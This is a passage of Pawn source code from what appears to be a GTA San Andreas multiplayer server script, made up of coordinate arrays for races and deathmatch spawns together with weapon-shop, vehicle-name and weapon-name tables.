	{1459.2290,1079.3514,96.2890},
	{1489.9513,938.8034,91.1571},
	{1615.2198,829.1098,88.5525},
	{1672.5469,670.4016,89.8013},
	{1538.9542,550.9477,85.2059},
	{1358.3312,556.8949,107.1119},
	{1174.8698,638.2738,132.8428},
	{1340.7310,912.7830,70.4448},
	{1411.8538,1176.5391,52.2624},
	{1402.8618,1597.5206,13.6334},
	{1389.4601,1787.0763,11.4722}
};
new Float:RacePositions_planes2[][4] = // planes
{
	// x, y, z, a
	{392.9749,2491.9705,17.4142,91.2932}, // spawn
	{396.3181,2506.4792,17.4515,86.9382}, // spawn
	{370.9828,2508.0315,17.2328,89.9384}, // spawn
	{364.9193,2491.7661,17.4790,91.8855}, // spawn
	{347.8476,2499.5376,17.9514,93.7635}, // spawn
	{343.7871,2518.3069,17.5903,80.9992}, // spawn
	{340.3315,2483.9497,17.4909,97.8518}, // spawn
	{311.1101,2505.6172,17.4680,94.2107}, // spawn
	{259.4920,2511.0398,22.8155},
	{131.6469,2490.0454,32.6550},
	{-27.1297,2390.3284,32.6352},
	{-182.4804,2288.6631,59.4055},
	{-279.3150,2226.4080,84.1077},
	{-459.1237,2178.6140,61.7320},
	{-615.0085,2129.5886,47.7119},
	{-766.2026,2123.3237,50.2792},
	{-927.2677,2170.4360,55.1823},
	{-1104.7382,2169.6831,51.9745},
	{-1256.2565,2130.8459,56.2528},
	{-1397.9304,2059.3638,78.9648},
	{-1483.3429,1928.5798,76.4950},
	{-1445.5236,1718.3762,60.7420},
	{-1388.7172,1553.8270,47.8069},
	{-1337.9559,1326.6144,29.6216},
	{-1298.1450,1117.3275,12.5185},
	{-1270.0885,967.9536,5.9193},
	{-1256.8033,797.9831,46.8547},
	{-1250.8538,710.9951,65.6276},
	{-1214.4342,520.8325,39.0528},
	{-1065.0159,436.4201,31.5719},
	{-874.5825,479.3983,14.0256},
	{-681.6100,673.6082,5.7809},
	{-580.9348,810.6562,23.7504},
	{-518.5934,948.3808,55.2308},
	{-510.6845,1122.2468,22.7696},
	{-517.5222,1333.2347,7.2091},
	{-588.9138,1538.9878,8.7535},
	{-638.7109,1746.3318,19.0138},
	{-607.9970,1954.4329,68.2710},
	{-579.9130,2103.2136,86.2436},
	{-509.8510,2236.9585,78.2042},
	{-274.9677,2236.1277,72.6366}
};
new Float:RacePositions_planes3[][4] = // planes
{
	// x, y, z, a
	{310.6245,2047.4468,18.5742,175.8475}, // spawn
	{307.4492,2004.7749,18.6283,175.9214}, // spawn
	{305.6763,1930.1063,18.5745,176.0010}, // spawn
	{306.7282,1878.8359,18.5856,176.0030}, // spawn
	{303.9387,1832.8430,18.5719,180.6028}, // spawn
	{465.4240,2018.9172,53.7751},
	{677.1101,2117.5925,74.1058},
	{842.4318,2389.8225,57.4926},
	{878.5219,2719.6924,66.4077},
	{1045.9857,2970.5420,65.5516},
	{1347.7679,2986.1147,71.2840},
	{1608.0095,2858.7756,44.6364},
	{1809.9055,2750.2271,73.1161},
	{1975.8000,2630.7673,105.4926},
	{2059.5710,2498.0286,120.7416},
	{2144.4739,2091.2693,67.7284},
	{2098.5779,1812.1356,77.8533},
	{1971.9487,1401.2560,82.8494},
	{1706.9028,1176.2056,82.6052},
	{1273.8616,1141.2900,52.7012},
	{724.9731,1420.0397,53.1182},
	{361.9663,1616.2338,41.4594},
	{203.0048,1879.4177,42.3326}
};
new Float:RacePositions_boats1[][4] = // boats
{
	// x, y, z, a
	{2266.6868,-253.0076,-0.1554,82.7378}, // spawn
	{2270.2412,-236.0733,-0.0692,80.1493}, // spawn
	{2267.8125,-213.8700,-0.0752,95.8582}, // spawn
	{2253.2930,-188.3017,-0.0951,95.6016}, // spawn
	{2252.4004,-173.9962,-0.0988,103.1049}, // spawn
	{2230.6545,-155.0531,-0.1964,75.4802}, // spawn
	{2156.6885,-170.3593,-0.0909},
	{2090.0735,-147.7252,0.1674},
	{2026.8378,-115.5074,0.2413},
	{1949.8638,-92.1888,0.2468},
	{1782.3601,-33.7725,-0.0663},
	{1733.9009,-26.8244,-0.0891},
	{1648.5410,-13.4290,-0.1700},
	{1604.2379,-71.3360,0.3425},
	{1588.6929,-119.4713,0.3758},
	{1552.5815,-183.4203,0.3625},
	{1479.5757,-237.5359,-0.1210},
	{1431.8827,-255.1073,0.0726},
	{1369.4110,-255.5471,0.3996},
	{1310.1260,-223.8975,-0.1738},
	{1206.6766,-142.9562,-0.1526},
	{1052.5507,-109.3643,0.0833},
	{923.4576,-120.5483,-0.1403},
	{814.1107,-150.0282,-0.1074}
};
new Float:RacePositions_boats2[][4] = // boats
{
	// x, y, z, a
	{2261.7610,-206.8061,-0.5104,101.3037}, // spawn
	{2262.9417,-214.9718,-0.5015,99.0423}, // spawn
	{2263.8459,-221.3767,-0.5066,98.7811}, // spawn
	{2264.7571,-229.6719,-0.4351,94.4059}, // spawn
	{2263.9214,-236.3807,-0.4453,93.7490}, // spawn
	{2264.0684,-245.0404,-0.4430,88.0811}, // spawn
	{2133.3398,-199.4539,-0.4584},
	{1817.0126,-45.3835,-0.5072},
	{1624.9259,-17.5529,-0.4463},
	{1538.8733,-192.3168,-0.4537},
	{1338.2251,-243.8371,-0.4465},
	{1034.6329,-110.0571,-0.4109},
	{833.6332,-137.6589,-0.4387},
	{664.7258,-222.1775,-0.4413},
	{472.5099,-257.5399,-0.4988},
	{291.1995,-360.7945,-0.4546},
	{169.2214,-414.5203,-0.3799},
	{14.3783,-540.4749,-0.3994},
	{-144.8962,-681.7877,-0.5163},
	{-241.2721,-609.5110,-0.4712},
	{-392.6457,-355.0972,-0.4595},
	{-730.5687,-330.0996,-0.2938},
	{-1045.5010,-149.7435,-0.4137},
	{-994.0894,79.0311,-0.5077},
	{-917.7571,260.7104,-0.4323},
	{-685.9022,650.7148,-0.2091},
	{-490.2446,866.0342,-0.4051},
	{-567.1823,1297.9353,-0.3986},
	{-629.6838,1644.3525,-0.4470},
	{-697.9728,1935.1527,-0.4475},
	{-775.3776,1750.5205,-0.4509},
	{-883.4055,1659.5070,-0.3532}
};
new Float:WWEPositions[][4] =
{
	{758.7691,13.0472,1001.1639,220.9623},
	{762.5781,9.5984,1001.1639,42.4467},
	{763.5621,-37.0813,1000.6865,269.7198},
	{770.8240,-36.7758,1000.6865,85.8958},
	{765.0258,-70.3708,1001.5692,315.2137},
	{768.6407,-66.5342,1001.5692,136.4032}
};
new WWEInteriors[] = {5,6,7};
new Float:WWEPickups1[][3] =
{
	{758.1890,7.3702,1000.7037},
	{760.6576,7.3618,1000.7092},
	{763.1196,7.3560,1000.7146},
	{765.2347,8.6477,1000.7125},
	{765.2328,10.6073,1000.7087},
	{765.0411,12.7451,1000.7047},
	{763.6650,14.7907,1000.7017},
	{761.0813,14.9883,1000.7031},
	{758.6381,15.2004,1000.7045},
	{757.1660,13.5619,1000.7045},
	{757.3368,11.7539,1000.7040},
	{757.1813,8.9526,1000.7023}
};
new Float:WWEPickups2[][3] =
{
	{773.1674,-41.3600,1000.6865},
	{773.1841,-36.5144,1000.6865},
	{773.2025,-33.7159,1000.6865},
	{770.6646,-32.0592,1000.6865},
	{766.9172,-31.7835,1000.6865},
	{762.8788,-32.3682,1000.6865},
	{762.9601,-36.2672,1000.6865},
	{763.3352,-39.8032,1000.6865},
	{765.9522,-41.4162,1000.6865},
	{769.5867,-41.5197,1000.6865}
};
new Float:WWEPickups3[][3] =
{
	{762.7733,-71.0259,1000.6563},
	{763.0680,-68.2024,1000.6635},
	{762.8297,-66.4755,1000.6635},
	{764.2971,-64.4271,1000.6563},
	{766.9084,-64.8257,1000.6635},
	{769.3661,-65.1608,1000.6635},
	{770.8121,-66.4247,1000.6635},
	{770.7040,-68.5142,1000.6635},
	{770.5703,-71.0954,1000.6563},
	{769.2220,-72.5131,1000.6563},
	{767.2302,-72.6524,1000.6563},
	{765.0663,-72.8038,1000.6563}
};
new Float:DMZ_RandomSpawns_Jetp[][4] =
{
	{2275.1426,1111.2716,71.8153,271.2251},
	{2311.7361,1105.1235,79.5547,113.3270},
	{2306.8042,1155.9266,85.9375,145.8906},
	{2284.4561,1171.4448,85.9375,156.3352},
	{2247.1846,1148.5002,79.5547,195.5022},
	{2205.4426,1141.3469,85.9375,252.9472},
	{2171.9106,1083.6968,85.9312,355.4807},
	{2188.0693,1049.3900,79.5547,288.9809},
	{2192.7703,1045.5731,79.5547,286.8920},
	{2200.2788,1001.2169,85.9375,330.7591},
	{2229.2305,998.9128,85.9375,351.6481},
	{2257.6409,1016.8620,79.5547,27.8588},
	{2291.4160,1030.3260,85.9375,31.4259},
	{2318.0317,1083.4775,85.9312,100.7936}
};
new Float:DMZ_RandomSpawns_RCWar[][4] =
{
	{-1081.6062,1046.2057,1343.5325,222.5462},
	{-1037.1414,1063.9246,1344.3984,77.1815},
	{-1008.3450,1078.9255,1343.2269,83.4482},
	{-978.9857,1053.2493,1344.9834,80.6283},
	{-1058.4739,1061.0720,1343.9114,291.5036},
	{-1127.6195,1066.2969,1345.7368,268.1484}
};
new Float:DMZ_RandomSpawns_Gren[][4] =
{
	{-2452.6340,1555.2982,28.9531,263.1803},
	{-2432.4658,1552.7489,31.8594,84.3698},
	{-2432.4880,1548.9136,34.4020,98.0730},
	{-2432.4497,1535.5684,34.4020,88.7147},
	{-2410.8931,1539.0270,31.8594,257.4984},
	{-2411.0088,1559.9092,31.8594,351.0815},
	{-2397.0010,1553.9044,31.8594,188.3138},
	{-2373.2688,1530.8402,31.8594,90.8674},
	{-2356.3896,1553.6183,26.0469,85.3330},
	{-2476.8352,1544.5957,55.4098,268.1936},
	{-2470.7222,1545.0756,36.7992,272.2043}
};
#pragma unused DMZ_RandomSpawns_Gren
new Float:DMZ_RandomSpawns_Mol[][4] =
{
	{-1579.9617,24.9179,17.3281,316.0658},
	{-1582.3683,27.0906,17.3281,316.0658},
	{-1585.5089,30.1187,17.3281,316.0658},
	{-1588.1552,32.9835,17.3281,316.0658},
	{-1591.0660,35.9924,17.3281,316.0658},
	{-1593.6069,38.5455,17.3281,316.0658},
	{-1596.6542,41.5279,17.3281,316.0658},
	{-1599.5240,44.4435,17.3281,316.0658},
	{-1602.3254,46.9335,17.3281,316.0658},
	{-1553.5577,81.8911,19.3315,311.1998},
	{-1533.1428,102.3407,19.3261,311.1998},
	{-1512.7931,122.1604,19.2925,311.1998},
	{-1503.5120,114.9817,19.3028,335.4779},
	{-1522.8718,95.6775,19.2944,309.5287},
	{-1543.1877,74.7825,19.3150,332.2561}
};
new Float:DMZ_RandomSpawns_FireMadness[][4] =
{
	{1168.1444,1324.7988,10.8125,188.0822},
	{1167.1909,1292.7529,10.8203,177.0527},
	{1166.2793,1263.8446,10.8203,177.0527},
	{1167.5519,1228.5983,10.8125,177.0527},
	{1148.1450,1226.9769,10.8203,93.8306},
	{1100.2531,1214.2306,10.8203,93.8306},
	{1112.9255,1215.4807,10.8203,299.7134},
	{1121.7107,1259.3723,10.8203,3.2162},
	{1118.5085,1295.6703,10.8203,3.2162},
	{1113.3613,1329.9547,10.8739,3.2162},
	{1146.6296,1356.6815,10.8203,248.2427}
};
new Float:DMZ_GunGame[][4] =
{
	{44.9961,1780.8857,17.6406,145.8267},
	{42.9824,1788.5665,24.0067,13.5988},
	{39.5303,1788.2548,23.8869,13.5988},
	{36.6797,1788.5641,24.0871,13.5988},
	{25.3304,1804.9371,17.6406,316.7400},
	{-25.6640,1781.5427,17.6443,352.7737},
	{1.7132,1835.5587,17.6406,346.1132},
	{-32.6550,1847.1321,17.6406,272.6954},
	{-6.6198,1892.2793,17.6476,130.4407},
	{-27.2564,1918.9515,17.6406,5.2746},
	{-31.1029,1975.4033,17.7199,260.9102}
};
new Float:DMZ_Boats[][4] =
{
	{-1326.7100,-1822.8318,-0.2428,218.2995},
	{-1197.2057,-1925.2252,-0.2419,177.6644},
	{-1339.7622,-1989.5480,-0.2654,285.6946},
	{-1163.2100,-2262.0359,-0.2074,134.2806},
	{-1187.7903,-2587.0127,-0.3116,182.6447},
	{-1135.4445,-2707.4021,-0.2823,89.2861},
	{-1294.4357,-2973.6047,-0.7166,261.9803},
	{-1113.0352,-2964.3215,-0.7456,286.5699},
	{-977.4111,-2912.6116,0.0608,71.7260},
	{-1093.1005,-2923.7595,-0.3410,174.4056}
};
new Float:DMZ_Deagle[][4] =
{
	{-1104.3066,-944.4050,129.2592,161.1058},
	{-1177.3329,-946.3073,135.6036,250.0932},
	{-1166.2814,-1024.5198,135.0709,280.1736},
	{-1140.7731,-1024.6454,132.9526,329.6808},
	{-1065.9022,-1031.9033,133.1838,333.4410},
	{-1044.7335,-1012.7023,137.0689,37.0482},
	{-1075.8129,-999.0586,135.0042,71.5152},
	{-1106.0590,-982.1396,129.2979,5.7146},
	{-1114.3457,-999.5065,129.4441,271.1105},
	{-1153.7135,-1034.0750,151.2390,290.8039},
	{-1092.9156,-999.9747,133.8395,50.5452},
	{-1165.3892,-993.9163,135.4100,294.9241},
	{-1116.9636,-946.1429,138.2674,141.0759},
	{-1160.7622,-930.3912,135.3201,211.2632},
	{-1047.0187,-1045.1559,135.7054,47.9916},
	{-1097.0325,-936.6917,132.5272,121.9389},
	{-1122.7850,-964.4753,133.8468,215.9398}
};
new Float:DMZ_Pirates[][4] =
{
	{-3434.8174,1819.7555,6.8522,296.0967},
	{-3410.3567,1831.5795,5.0709,114.5300},
	{-3393.6389,1840.1340,8.5532,291.7101},
	{-3457.8713,1805.0021,5.0476,47.0412},
	{-3476.4519,1813.1548,3.3948,325.5738},
	{-3490.6536,1828.5066,3.6402,232.1996},
	{-3485.8010,1859.3627,7.6022,257.8932},
	{-3464.3457,1857.8752,5.8209,357.5341},
	{-3452.5654,1854.8273,6.8522,250.6864},
	{-3491.7268,1903.8657,10.8596,101.5617},
	{-3509.0671,1899.6448,5.6042,23.1551},
	{-3531.5229,1889.1201,4.3434,276.0900},
	{-3445.3364,1884.5900,3.3649,171.1223},
	{-3441.1836,1898.6820,3.1540,261.9898},
	{-3426.1223,1920.6047,5.7032,213.4227},
	{-3434.7151,1940.1890,4.5227,191.1757},
	{-3431.7961,1924.4133,3.8118,178.6423},
	{-3468.3037,1883.7859,5.5758,92.1849},
	{-3504.0928,1871.0791,5.5774,106.2850},
	{-3553.0466,1845.3815,14.9653,318.1003},
	{-3542.3882,1908.2341,1.6827,268.2798},
	{-3466.2339,1925.8546,2.3223,248.5396},
	{-3441.4519,1960.3199,4.5820,171.4589},
	{-3330.1919,1866.2903,2.2003,61.8146}
};
new Float:DriftPositions_1[][4] =
{
	// x, y, z, a
	{2320.8093,1393.8324,42.5268,359.5473}, // spawn 1
	{2333.0850,1394.5033,42.5263,3.1412}, // spawn 2
	{2326.4226,1417.9100,42.3993,358.3418},
	{2323.2439,1452.4265,42.3897},
	{2311.5264,1503.1876,42.3776},
	{2279.7629,1501.3727,42.2636},
	{2282.2590,1463.8866,39.8775},
	{2284.3232,1404.6503,36.0876},
	{2335.5752,1409.9380,35.5473},
	{2302.5737,1507.0801,29.5926},
	{2283.5613,1465.0750,27.1567},
	{2313.9233,1398.7598,23.1971},
	{2331.8303,1442.9036,20.6666},
	{2320.7100,1504.8649,16.7444},
	{2276.1724,1479.1611,15.2542},
	{2281.8872,1408.5913,10.7469},
	{2306.0747,1381.6716,10.2633}
};
new Float:DriftPositions_2[][4] =
{
	// x, y, z, a
	{-2431.7996,-600.2036,132.0731,215.6459}, // spawn 1
	{-2427.6941,-597.3598,132.0723,214.2281}, // spawn 2
	{-2405.9785,-627.7079,131.9418},
	{-2346.4607,-701.3117,111.8341},
	{-2352.2820,-769.7437,95.7464},
	{-2259.4526,-754.5983,75.2640},
	{-2194.4961,-811.4877,59.6021}
};
new Float:DriftPositions_3[][4] =
{
	// x, y, z, a
	{-772.2188,-1724.5984,96.1940,349.9267}, // drift2spawn
	{-766.0464,-1726.2227,96.1950,345.6118}, // drift2spawn
	{-758.2865,-1594.5811,95.0332},
	{-758.7239,-1527.1305,91.9235},
	{-763.3603,-1369.5243,80.8407},
	{-725.8790,-1286.4279,65.1257},
	{-716.4683,-1504.8101,57.3239},
	{-718.7143,-1678.3099,49.9656},
	{-677.0948,-1675.7222,32.1434},
	{-656.3034,-1478.3372,20.0662}
};
new Float:PRacePositions_1[][4] =
{
	// x, y, z, a
	{2320.8093,1393.8324,42.5268,359.5473}, // spawn 1
	{2333.0850,1394.5033,42.5263,3.1412}, // spawn 2
	{2326.4226,1417.9100,42.3993,358.3418},
	{2323.2439,1452.4265,42.3897},
	{2311.5264,1503.1876,42.3776},
	{2279.7629,1501.3727,42.2636},
	{2282.2590,1463.8866,39.8775},
	{2284.3232,1404.6503,36.0876},
	{2335.5752,1409.9380,35.5473},
	{2302.5737,1507.0801,29.5926},
	{2283.5613,1465.0750,27.1567},
	{2313.9233,1398.7598,23.1971},
	{2331.8303,1442.9036,20.6666},
	{2320.7100,1504.8649,16.7444},
	{2276.1724,1479.1611,15.2542},
	{2281.8872,1408.5913,10.7469},
	{2306.0747,1381.6716,10.2633}
};
new Float:PRacePositions_2[][4] =
{
	// x, y, z, a
	{-2431.7996,-600.2036,132.0731,215.6459}, // spawn 1
	{-2427.6941,-597.3598,132.0723,214.2281}, // spawn 2
	{-2405.9785,-627.7079,131.9418},
	{-2346.4607,-701.3117,111.8341},
	{-2352.2820,-769.7437,95.7464},
	{-2259.4526,-754.5983,75.2640},
	{-2194.4961,-811.4877,59.6021}
};
new Float:PRacePositions_3[][4] =
{
	// x, y, z, a
	{-772.2188,-1724.5984,96.1940,349.9267}, // spawn 1
	{-766.0464,-1726.2227,96.1950,345.6118}, // spawn 2
	{-758.2865,-1594.5811,95.0332},
	{-758.7239,-1527.1305,91.9235},
	{-763.3603,-1369.5243,80.8407},
	{-725.8790,-1286.4279,65.1257},
	{-716.4683,-1504.8101,57.3239},
	{-718.7143,-1678.3099,49.9656},
	{-677.0948,-1675.7222,32.1434},
	{-656.3034,-1478.3372,20.0662}
};
new SAmmunation[][AmmunationEnum] =
{
	// name,			id,	cost,	ammo
	{"Pistol",			22,	100,	100},
	{"DesertEagle",		24,	250,	100},
	{"CombatShotgun",	27,	250,	100},
	{"SawnoffShotgun",	26,	300,	100},
	{"MicroUzi",		28,	150,	200},
	{"Tec9",			32,	150,	200},
	{"M4",				31,	350,	100},
	{"SniperRifle",		34,	350,	10},
	{"Grenade",			16,	450,	2},
	{"Molotov",			18,	450,	2},
	//{"RocketLauncher",	35,	2500,	1},
	{"Flowers",			14,	5,		0}
};
new VehicleNames[212][32] =
{
   "Landstalker",
   "Bravura",
   "Buffalo",
   "Linerunner",
   "Pereniel",
   "Sentinel",
   "Dumper",
   "Firetruck",
   "Trashmaster",
   "Stretch",
   "Manana",
   "Infernus",
   "Voodoo",
   "Pony",
   "Mule",
   "Cheetah",
   "Ambulance",
   "Leviathan",
   "Moonbeam",
   "Esperanto",
   "Taxi",
   "Washington",
   "Bobcat",
   "Mr Whoopee",
   "BF Injection",
   "Hunter",
   "Premier",
   "Enforcer",
   "Securicar",
   "Banshee",
   "Predator",
   "Bus",
   "Rhino",
   "Barracks",
   "Hotknife",
   "Trailer",
   "Previon",
   "Coach",
   "Cabbie",
   "Stallion",
   "Rumpo",
   "RC Bandit",
   "Romero",
   "Packer",
   "Monster Truck A",
   "Admiral",
   "Squalo",
   "Seasparrow",
   "Pizzaboy",
   "Tram",
   "Trailer",
   "Turismo",
   "Speeder",
   "Reefer",
   "Tropic",
   "Flatbed",
   "Yankee",
   "Caddy",
   "Solair",
   "Berkley's RC Van",
   "Skimmer",
   "PCJ-600",
   "Faggio",
   "Freeway",
   "RC Baron",
   "RC Raider",
   "Glendale",
   "Oceanic",
   "Sanchez",
   "Sparrow",
   "Patriot",
   "Quad",
   "Coastguard",
   "Dinghy",
   "Hermes",
   "Sabre",
   "Rustler",
   "ZR-350",
   "Walton",
   "Regina",
   "Comet",
   "BMX",
   "Burrito",
   "Camper",
   "Marquis",
   "Baggage",
   "Dozer",
   "Maverick",
   "News Chopper",
   "Rancher",
   "FBI Rancher",
   "Virgo",
   "Greenwood",
   "Jetmax",
   "Hotring",
   "Sandking",
   "Blista Compact",
   "Police Maverick",
   "Boxville",
   "Benson",
   "Mesa",
   "RC Goblin",
   "Hotring Racer 1",
   "Hotring Racer 2",
   "Bloodring Banger",
   "Rancher",
   "Super GT",
   "Elegant",
   "Journey",
   "Bike",
   "Mountain Bike",
   "Beagle",
   "Cropdust",
   "Stunt",
   "Tanker",
   "RoadTrain",
   "Nebula",
   "Majestic",
   "Buccaneer",
   "Shamal",
   "Hydra",
   "FCR-900",
   "NRG-500",
   "HPV1000",
   "Cement Truck",
   "Tow Truck",
   "Fortune",
   "Cadrona",
   "FBI Truck",
   "Willard",
   "Forklift",
   "Tractor",
   "Combine",
   "Feltzer",
   "Remington",
   "Slamvan",
   "Blade",
   "Freight",
   "Streak",
   "Vortex",
   "Vincent",
   "Bullet",
   "Clover",
   "Sadler",
   "Firetruck",
   "Hustler",
   "Intruder",
   "Primo",
   "Cargobob",
   "Tampa",
   "Sunrise",
   "Merit",
   "Utility",
   "Nevada",
   "Yosemite",
   "Windsor",
   "Monster Truck B",
   "Monster Truck C",
   "Uranus",
   "Jester",
   "Sultan",
   "Stratum",
   "Elegy",
   "Raindance",
   "RC Tiger",
   "Flash",
   "Tahoma",
   "Savanna",
   "Bandito",
   "Freight",
   "Trailer",
   "Kart",
   "Mower",
   "Duneride",
   "Sweeper",
   "Broadway",
   "Tornado",
   "AT-400",
   "DFT-30",
   "Huntley",
   "Stafford",
   "BF-400",
   "Newsvan",
   "Tug",
   "Trailer",
   "Emperor",
   "Wayfarer",
   "Euros",
   "Hotdog",
   "Club",
   "Trailer",
   "Trailer",
   "Andromada",
   "Dodo",
   "RC Cam",
   "Launch",
   "Police Car (LSPD)",
   "Police Car (SFPD)",
   "Police Car (LVPD)",
   "Police Ranger",
   "Picador",
   "S.W.A.T. Van",
   "Alpha",
   "Phoenix",
   "Glendale",
   "Sadler",
   "Luggage Trailer A",
   "Luggage Trailer B",
   "Stair Trailer",
   "Boxville",
   "Farm Plow",
   "Utility Trailer"
};
new Float:KartPositions[][4] =
{
	// x, y, z, a
	{1493.5011,-1150.6019,135.1128,271.0335},
	{1549.7472,-1150.5513,135.1128,89.1923},
	{1493.5011,-1145.6019,135.1128,271.0335},
	{1549.7472,-1145.5513,135.1128,89.1923},
	{1493.5011,-1140.6019,135.1128,271.0335},
	{1549.7472,-1140.5513,135.1128,89.1923},
	{1493.5011,-1135.6019,135.1128,271.0335},
	{1549.7472,-1135.5513,135.1128,89.1923},
	{1493.5011,-1130.6019,135.1128,271.0335},
	{1549.7472,-1130.5513,135.1128,89.1923},
	{1493.5011,-1125.6019,135.1128,271.0335},
	{1549.7472,-1125.5513,135.1128,89.1923},
	{1493.5011,-1120.6019,135.1128,271.0335},
	{1549.7472,-1120.5513,135.1128,89.1923},
	{1493.5011,-1115.6019,135.1128,271.0335},
	{1549.7472,-1115.5513,135.1128,89.1923}
};
new Float:MonsterPositions[][4] =
{
	// x, y, z, a
	{-1367.1875,1020.0675,1025.4971,172.0661},
	{-1352.6119,1014.5676,1025.3285,133.4695},
	{-1339.2988,994.5236,1024.9327,84.7540},
	{-1355.8500,976.0822,1024.6056,41.9719},
	{-1381.9631,970.6732,1024.6658,345.1539},
	{-1410.3369,969.2608,1024.8108,338.7082},
	{-1437.0913,970.9547,1025.0037,329.5709},
	{-1456.8361,983.1830,1025.2461,303.3096},
	{-1459.5251,1005.5297,1025.6537,244.7194},
	{-1443.5648,1020.0569,1026.0367,193.9913},
	{-1413.0665,1020.8574,1025.5538,187.4881},
	{-1394.1953,1020.7808,1025.5369,187.2464},
	{-1359.3929,1020.3069,1025.7037,157.5711},
	{-1334.4923,1008.2554,1025.7871,134.6035},
	{-1340.8550,982.9427,1024.9844,60.7107},
	{-1372.8763,972.2613,1024.5333,5.2141},
	{-1402.6781,969.5472,1024.7783,6.4428},
	{-1431.0925,966.5847,1025.2233,330.6417}
};
new ActivitiesGameTextTimes[] =
{
	115,
	100,
	90,
	75,
	50,
	40,
	30,
	20,
	15,
	10,
	3,
	2,
	1
};
new Float:VIPCamera[][6] =
{
	{212.171386,1896.663696,16.199859,212.597961,1891.681884,16.199859},
	{4.929317,2068.139404,19.447860,-0.025807,2067.470947,19.447860},
	{-0.942762,2057.378173,29.808864,3.534595,2055.152587,29.808864},
	{281.982238,1915.403320,31.640625,278.965911,1919.390991,31.640625},
	{256.034210,1965.325683,34.633163,254.029052,1960.745361,34.633163}
};
new WeaponNames[48][32] =
{
	"Unarmed (Fist)", // 0
	"Brass Knuckles", // 1
	"Golf Club", // 2
	"Night Stick", // 3
	"Knife", // 4
	"Baseball Bat", // 5
	"Shovel", // 6
	"Pool Cue", // 7
	"Katana", // 8
	"Chainsaw", // 9
	"Purple Dildo", // 10
	"Big White Vibrator", // 11
	"Medium White Vibrator", // 12
	"Small White Vibrator", // 13
	"Flowers", // 14
	"Cane", // 15
	"Grenade", // 16
	"Teargas", // 17
	"Molotov", // 18
	" ", // 19
	" ", // 20
	" ", // 21
	"Pistol", // 22
	"Silenced Pistol", // 23
	"Desert Eagle", // 24
	"Shotgun", // 25
	"Sawnoff Shotgun", // 26
	"Combat Shotgun", // 27
	"Micro Uzi", // 28
	"MP5", // 29
	"AK47", // 30
	"M4", // 31
	"Tec9", // 32
	"Country Rifle", // 33
	"Sniper Rifle", // 34
	"Rocket Launcher", // 35
	"Heat-Seeking Rocket Launcher", // 36
	"Flamethrower", // 37
	"Minigun", // 38
	"Satchel Charge", // 39
	"Detonator", // 40
	"Spray Can", // 41
	"Fire Extinguisher", // 42
	"Camera", // 43
	"Night Vision Goggles", // 44
	"Infrared Vision Goggles", // 45
	"Parachute", // 46
	"Fake Pistol" // 47
};
new MoneyAreas[][MoneyAreaEnum] =
{
	// minx, miny, maxx, maxy, minz, maxz
	{"LV Pirate Ship",{1995.5,1518.0,2006.0,1569.0,13.0,28.0},-1,-1}, // LV Pirate Ship
	{"LS Cemetery",{804.0149,-1127.1915,867.1545,-1069.0072,23.28,32.0},-1,-1}, // LS Cemetery
	{"LS Cemetery",{867.1545,-1127.1936,938.2277,-1052.9233,23.28,32.0},-1,-1} // LS Cemetery #2
};
new SRacePositions_1[][SRaceEnum] = // original srace
{
	// type, x, y, z, a
	// type: 0=spawn 1=foot 2=swim/jetpack)
	{0,2181.4829,-117.3142,4.1922,132.1281}, // spawn
	{0,2177.7495,-113.5779,4.1130,133.7673}, // spawn
	{0,2173.2485,-109.4830,3.9845,133.7673}, // spawn
	{0,2164.8171,-96.1935,3.7130,133.7673}, // spawn
	{0,2160.1191,-88.7104,3.5032,133.7673}, // spawn
	{0,2157.8220,-85.3038,3.3364,117.1605}, // spawn
	{0,2155.1416,-80.2608,3.3173,117.1605}, // spawn
	{0,2152.0090,-73.9758,3.7826,117.1605}, // spawn
	{0,2148.5964,-68.3915,3.8491,117.1605}, // spawn
	{0,2144.0935,-62.6281,4.0919,117.1605}, // spawn
	{0,2142.7522,-54.1215,4.3960,117.1605}, // spawn
	{0,2138.6914,-43.2350,3.9959,117.1605}, // spawn
	{0,2135.0991,-35.8521,3.5607,117.1605}, // spawn
	{0,2133.8613,-24.6281,3.7617,117.1605}, // spawn
	{1,2136.2141,-79.9504,2.9875,130.5614}, // foot
	{1,2119.1577,-92.7274,2.3203,130.5614}, // foot
	{1,2101.9976,-103.9981,2.3129,130.5614}, // foot
	{2,2083.7493,-116.8878,-0.5578,125.2347}, // swim
	{2,2063.7996,-135.1216,-0.5441,140.9015}, // swim
	{2,2050.0889,-151.9941,-0.5234,140.9015}, // swim
	{2,2033.1833,-172.8005,-0.2890,140.9015}, // swim
	{2,2016.6321,-193.1681,-0.2402,140.9015}, // swim
	{2,1996.0552,-224.0949,-0.5123,148.1082}, // swim
	{2,1980.9476,-248.3742,-0.3689,148.1082}, // swim
	{1,1970.0977,-267.9355,3.0157,148.1082}, // foot
	{1,1949.2217,-308.1130,10.5480,157.1950}, // foot
	{1,1937.3013,-361.7955,20.4411,154.6883}, // foot
	{1,1919.3907,-417.8201,21.5706,172.3138}, // foot
	{1,1906.4409,-477.9243,18.6378,173.4885}, // foot
	{1,1907.2905,-525.4886,19.5700,202.9421}, // foot
	{1,1925.7235,-557.4222,22.1321,220.5676}, // foot
	{2,1930.7930,-594.2236,44.9534,165.6551}, // jetpack
	{2,1922.1388,-649.0884,94.1629,162.5217}, // jetpack
	{2,1851.2841,-775.3363,119.6738,150.3016}, // jetpack
	{2,1799.0835,-870.8008,139.2892,150.3016}, // jetpack
	{2,1733.3008,-987.8911,115.3672,142.4682}, // jetpack
	{2,1679.6310,-1100.7605,121.9021,156.5683}, // jetpack
	{2,1631.0925,-1212.5453,100.3812,156.5683}, // jetpack
	{2,1593.6234,-1288.6611,42.8325,156.5683}, // jetpack
	{1,1577.8147,-1323.7844,16.4828,156.5683}, // foot
	{1,1540.8833,-1361.0149,329.4602,1.6392} // foot
};
new SRacePositions_2[][SRaceEnum] = // waterace
{
	// type, x, y, z, a
	// type: 0=spawn 1=cp, 2=down, 3=up)
	{0,-1639.7920,1304.6340,7.0261,312.9698}, // spawn
	{0,-1640.5193,1305.5867,7.0260,309.5794}, // spawn
	{0,-1641.1285,1306.5564,7.0258,304.6222}, // spawn
	{0,-1641.7458,1307.2777,7.0257,311.8852}, // spawn
	{0,-1642.3721,1308.0516,7.0257,311.9414}, // spawn
	{0,-1643.0867,1308.8756,7.0284,311.9977}, // spawn
	{0,-1643.9371,1309.7800,7.0288,312.3672}, // spawn
	{0,-1644.9943,1310.7574,7.0293,311.4834}, // spawn
	{0,-1645.8684,1311.7288,7.0298,311.5396}, // spawn
